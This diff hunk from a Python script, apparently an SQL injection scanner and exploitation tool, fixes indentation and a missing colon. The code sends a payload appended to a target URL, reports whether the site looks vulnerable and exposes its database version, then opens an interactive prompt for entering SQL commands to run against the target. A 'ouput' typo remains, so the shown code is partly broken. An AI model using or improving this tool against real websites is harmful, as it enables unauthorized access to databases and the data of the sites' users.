@@ -18,14 +18,14 @@ def check():
 	req = http.request('GET', url + path + payload)
 	scrape = BeautifulSoup(req.data, 'html.parser')
 	outputs = scrape.find_all('node')
-		for output in outputs:
-			o = ouput.get('url')
-			if o in scrape:
-				print("\033[00;32m[+] Found Database Version: \033[01;32m%s" % o)
-				print("\033[00;32m[+] The Website is Vulnerable")
-			else:
-				print("\033[00;31m[-] The Website not Vulnerable ")
-def command()
+	for output in outputs:
+		o = ouput.get('url')
+		if o in scrape:
+			print("\033[00;32m[+] Found Database Version: \033[01;32m%s" % o)
+			print("\033[00;32m[+] The Website is Vulnerable")
+		else:
+			print("\033[00;31m[-] The Website not Vulnerable ")
+def command():
 	while(True):
 		sql_command = input("\033[00;31msql_command_1> ")
 		sql_command_1 = input("\033[00;31msql_command_2[optional]> ")
